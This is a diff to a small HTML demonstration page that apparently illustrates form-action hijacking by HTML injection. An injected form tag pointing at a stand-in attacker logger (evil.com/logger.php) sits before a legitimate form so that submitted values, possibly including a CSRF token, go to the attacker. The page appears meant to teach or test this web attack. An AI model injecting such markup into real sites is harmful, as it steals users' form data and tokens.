@@ -1,14 +1,16 @@
 <!-- if we have a possibility for injection - we can override form action by injection a form tag before the legitimate form -->
 <!-- especially useful when autocomplete sets some values by dfault -->
 <html>
-
+Suppose the attacker was able to inject &quot;&gt;&lt;form action="some_attackers_controlled_url"&gt;<br>
+Then the default action of the legal form will be changed to the first encountered value and the data will go wherever attacker specify<br>
+This can also be dangerous as CSRF token might be submitted too if an attacker directs form submission to a valid action on the same site<br>
 <!-- injection goes here -->
-<form action="http://evil666.com/logger.php">
+<form action="http://evil.com/logger.php">
 <input type="submit"><br>
 end of injected code<br>
 <br>
 
-<form action="account.php">
+<form action="http://legal.com/account.php" method="POST">
 This is a legitimate form and a legitimate submit button<br>
 <input value="test" name="somevalue"><br>
 <input type="submit"><br>
